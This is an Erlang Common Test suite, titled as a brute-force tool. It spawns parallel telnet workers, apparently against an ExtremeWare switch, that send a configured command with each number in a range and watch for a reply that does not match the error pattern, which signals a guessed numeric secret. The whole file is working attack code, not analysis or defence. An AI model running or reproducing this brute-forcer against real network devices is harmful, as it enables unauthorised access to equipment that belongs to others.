-module(extremeware_brute_SUITE).
-export([all/0,suite/0,main/1]).

-record(settings,{threads,limit,command,error,error_mp=undefined}).

suite() ->
	ct:require(ew_telnet), [{timetrap,infinity},{silent_connections,[telnet]}].
set_ew_defaults([{threads,Threads}|Ss],S) ->  
    set_ew_defaults(Ss,S#settings{threads=Threads});
set_ew_defaults([{limit,Limit}|Ss],S) ->
    set_ew_defaults(Ss,S#settings{limit=Limit});
set_ew_defaults([{command,Command}|Ss],S) ->
    set_ew_defaults(Ss,S#settings{command=Command});
set_ew_defaults([{error,Error}|Ss],S) ->
    set_ew_defaults(Ss,S#settings{error=Error});
set_ew_defaults([],S) ->
    S.

all() -> [main].
main(_) ->
	process_flag(trap_exit, true),
	PreSettings = set_ew_defaults(ct:get_config(extremeware),#settings{}),
	{ok,Mp} = re:compile(PreSettings#settings.error,[firstline]),
	Settings = PreSettings#settings{error_mp=Mp},
	Threads = Settings#settings.threads, Limit = Settings#settings.limit,
	NZeroIncl = Threads - 1, NWOLast = NZeroIncl - 1,
	Size = Limit div Threads, Delta = Limit - (Size * Threads),
	%[I] = [ Clp ||
	%			Clp <- lists:seq(0,NWOLast),
	%			part(Clp,Size,0,Settings) > NWOLast ],
	%ct:pal("Generated fragments"),
	Pids = lists:map(fun(X) -> part(X,Size,0,Settings) end,lists:seq(0,NWOLast)),
	Last = part(NZeroIncl,Size,Delta,Settings),
	loop([Last|Pids]).

part(N,S,D,Settings) ->
	M = N * S,
	Fragment = lists:seq(M + 1,M + S + D),
	%timer:sleep(1000),
	Pid = spawn_link(fun() -> worker({Fragment},Settings) end),
	ct:pal("Thread ~w starts at ~w",[Pid,M + 1]),
	Pid.
worker({L},Settings) ->
	receive
		stop ->
			%ct:pal("Halting"),
			true
		after 0 ->
			{ok,Handler} = ct_telnet:open(unix,telnet,ew_telnet),
			worker({Handler,L},Settings)
	end;
worker({Handler,[X|Xs]},Settings) ->
	receive
		stop ->
			%ct:pal("Halting on ~w",[X]),
			worker({Handler,[]},Settings)
		after 0 ->
			%timer:sleep(500),
			ok = ct_telnet:sendf(Handler,"~s ~B",[Settings#settings.command,X]),
			{ok,Data} = ct_telnet:get_data(Handler),
			case Data of
				[] ->
					% May stuck in loop :\
					worker({Handler,[X|Xs]},Settings);
				_ ->
					case re:run(Data,Settings#settings.error_mp,[{capture,none}]) of
						match ->
							worker({Handler,Xs},Settings);
						_ ->
							ct:pal("Done! ~s",[Data]), ct_telnet:close(Handler), Data = fail
					end
			end
	end;
worker({Handler,[]},_) ->
	ct_telnet:close(Handler), true.
loop([X|Xs]) ->
	receive
		{_,Pid,normal} ->
			%ct:pal("~w finished normally",[Pid]),
			loop(check([X|Xs]));
		{_,Pid,_} ->
			%ct:pal("~w finished early",[Pid]),
			%[ LP ! stop || LP <- begin {links, P} = process_info(self(), links), P end ],
			lists:foreach(fun(Y) -> Y ! stop end,[X|Xs]),
			timer:sleep(3000),
			loop([])
		after 0 ->
			loop(check([X|Xs]))
	end;
loop([]) ->
	true.
check([X|Xs]) ->
	case is_process_alive(X) of
		false -> Xs;
		true -> Xs ++ [X]
	end.
